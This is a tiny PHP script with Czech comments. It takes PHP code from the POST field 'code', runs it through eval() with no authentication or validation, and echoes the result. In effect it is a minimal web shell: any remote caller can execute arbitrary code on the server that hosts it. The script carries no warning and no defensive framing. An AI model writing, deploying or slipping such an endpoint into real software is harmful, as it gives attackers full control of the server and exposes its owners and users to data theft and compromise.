<?php
// Získání PHP kódu z přijatých dat
$code = $_POST['code'];

// Vykonání PHP kódu
$result = eval('?' . '>' . $code);

// Vrácení výsledku
echo $result;
?>